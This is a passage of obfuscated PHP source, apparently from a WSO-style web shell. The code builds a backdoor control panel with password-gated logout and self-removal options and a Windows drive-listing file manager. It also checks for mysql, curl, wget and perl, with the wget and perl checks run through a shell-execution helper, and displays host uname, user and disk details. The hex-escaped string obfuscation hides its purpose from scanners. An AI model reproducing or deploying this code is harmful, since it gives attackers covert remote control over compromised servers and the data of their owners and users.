\x44\x6fm\x61\x69\x6es"=>"Do\x6dai\x6es");if(!empty($GLOBALS["\x61\x75th\x5fp\x61s\x73"]))${${"\x47LOB\x41\x4cS"}["\x6a\x6a\x75i\x6cpbk\x73nh\x78"]}["L\x6f\x67\x6f\x75t"]="Lo\x67\x6f\x75t";${$wohcidh}["Se\x6cf\x20\x72e\x6d\x6f\x76\x65"]="\x53\x65lfR\x65\x6dov\x65";${$mnscxzbdo}="";foreach(${${"\x47L\x4fBAL\x53"}["\x6aj\x75i\x6c\x70\x62\x6bs\x6e\x68x"]} as${${"G\x4c\x4fB\x41\x4c\x53"}["fm\x63\x65\x6e\x61w"]}=>${${"G\x4c\x4fB\x41\x4c\x53"}["\x75\x6a\x75\x6f\x6f\x66\x77i"]})${$eieocduv}.="\x3c\x74h\x20w\x69\x64\x74h\x3d\x22".(int)(100/count(${${"\x47LO\x42A\x4cS"}["j\x6aui\x6cp\x62k\x73\x6eh\x78"]}))."\x25\">[ \x3ca h\x72\x65\x66\x3d\x22\x23\x22\x20o\x6e\x63lic\x6b=\"g(\x27".${$mhflnceonkx}."',nu\x6cl,'\x27,\x27\x27,'')\">".${${"G\x4c\x4f\x42\x41L\x53"}["\x6e\x64\x6b\x61\x73w\x63\x6f"]}."\x3c/\x61>\x20]\x3c/t\x68>";$rcpzhvxrfej="men\x75";${${"G\x4c\x4f\x42A\x4c\x53"}["wi\x77s\x69r\x6d"]}="";if($GLOBALS["o\x73"]=="\x77\x69n"){$uwxmpg="dr\x69\x76\x65";foreach(range("a","\x7a")as${$uwxmpg}){$lvhtbhpnyf="\x64\x72\x69v\x65";if(is_dir(${${"\x47\x4c\x4f\x42\x41LS"}["\x6b\x6d\x72\x68q\x6asl"]}.":\\"))${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x77\x69\x77\x73\x69\x72\x6d"]}.="<\x61\x20\x68\x72ef\x3d\x22#\"\x20\x6fn\x63l\x69\x63\x6b=\x22g(\x27Fil\x65sM\x61n\x27,'".${$lvhtbhpnyf}.":/\x27)\">[\x20".${${"G\x4cOB\x41\x4c\x53"}["k\x6d\x72\x68q\x6a\x73\x6c"]}." ]\x3c/a\x3e\x20";}}function showstat($stat){if(${${"G\x4c\x4f\x42A\x4cS"}["\x76\x64\x71\x67\x73\x79o\x71\x78\x75p"]}=="on"){return"\x3cb><f\x6f\x6et \x73ty\x6c\x65='c\x6flor:li\x6d\x65'>O\x4e</\x66\x6f\x6e\x74\x3e\x3c/\x62\x3e";}else{return"<\x62><\x66ont \x73t\x79le=\x27\x63\x6fl\x6f\x72:\x72\x65\x64\x27\x3e\x4f\x46\x46\x3c/\x66\x6f\x6et></\x62\x3e";}}function hdd($s){${"\x47\x4c\x4f\x42AL\x53"}["t\x6e\x6b\x6e\x6b\x65\x6es\x7a\x6b\x62"]="\x73";${"\x47\x4cO\x42\x41\x4cS"}["\x69m\x78\x76\x65rjr"]="\x73";$pylskdnl="\x73";$xlqvxpgh="\x73";if(${${"GL\x4f\x42\x41\x4c\x53"}["\x74\x6ek\x6ek\x65\x6e\x73z\x6b\x62"]}>=1073741824)return sprintf("\x25\x31\x2e2\x66",${${"GL\x4fB\x41\x4c\x53"}["\x73xu\x65\x7a\x65io\x66iq\x65"]}/1073741824)."\x20G\x42";elseif(${$pylskdnl}>=1048576)return sprintf("%\x31\x2e2\x66",${${"G\x4cO\x42\x41LS"}["s\x78\x75\x65\x7ae\x69o\x66\x69\x71e"]}/1048576)." M\x42";elseif(${$xlqvxpgh}>=1024)return sprintf("\x251.2f",${${"\x47\x4c\x4f\x42\x41LS"}["\x69\x6d\x78\x76\x65\x72\x6a\x72"]}/1024)."\x20K\x42";else return${${"\x47\x4cOB\x41\x4c\x53"}["\x73x\x75ezei\x6f\x66\x69\x71\x65"]}." B";}function testmysql(){if(function_exists("my\x73\x71\x6c_\x63\x6f\x6e\x6eec\x74")){return showstat("o\x6e");}else{return showstat("off");}}function testcurl(){if(function_exists("cur\x6c_\x76\x65r\x73\x69\x6fn")){return showstat("\x6f\x6e");}else{return showstat("off");}}function testwget(){if(ex("wg\x65\x74 --\x68\x65lp")){return showstat("\x6fn");}else{return showstat("\x6fff");}}function testperl(){if(ex("\x70e\x72l\x20-\x68")){return showstat("\x6f\x6e");}else{return showstat("\x6f\x66f");}}echo"<\x73\x70\x61n\x20\x63lass\x3d\x69\x6ef\x6f>&n\x62s\x70;\x4dyS\x51L:\x20".testmysql()."&nb\x73p\x3b|&nbs\x70;P\x65r\x6c: ".testperl()."&\x6eb\x73p\x3b|\x26\x6eb\x73\x70\x3bc\x55\x52L: ".testcurl()."\x26n\x62sp;|&\x6ebs\x70;\x57G\x65\x74: ".testwget()."<\x62\x72>";echo"<t\x61ble\x20cl\x61\x73\x73\x3d\x69\x6e\x66\x6f c\x65llp\x61\x64\x64in\x67\x3d\x33\x20cel\x6c\x73\x70\x61\x63\x69ng=\x30\x20w\x69\x64\x74\x68\x3d1\x30\x30%\x3e<\x74r\x3e<t\x64\x20width=\x31>\x3csp\x61n>\x55\x6e\x61m\x65:\x3c\x62r\x3e\x55s\x65\x72:\x3cbr\x3ePhp:\x3cb\x72\x3e\x48\x64d:<\x62r>\x43\x77\x64:".($GLOBALS["o\x73"]=="\x77in"?"<\x62\x72>\x44r\x69ve\x73:":"")."\x3c/\x73\x70\x61\x6e\x3e\x3c/\x74\x64>"."\x3ct\x64\x3e\x3c\x6e\x6fb\x72\x3e".substr(@php_uname(),0,120)."\x20 \x3ca\x20h\x72\x65f\x3d\x22\x68ttp://w\x77w\x2e\x67o\x6f\x67\x6ce\x2e\x63\x6f\x6d/se\x61\x72\x63h?q=".urlencode(@php_uname())."\"\x20t\x61rg\x65\x74=\"_\x62la\x6ek\x22>[\x47\x6f\x6fgle]</\x61\x3e \x3ca \x68ref=\x22".${${"\x47\x4c\x4fBA\x4c\x53"}["x\x77\x6e\x6ens"]}."\" t\x61\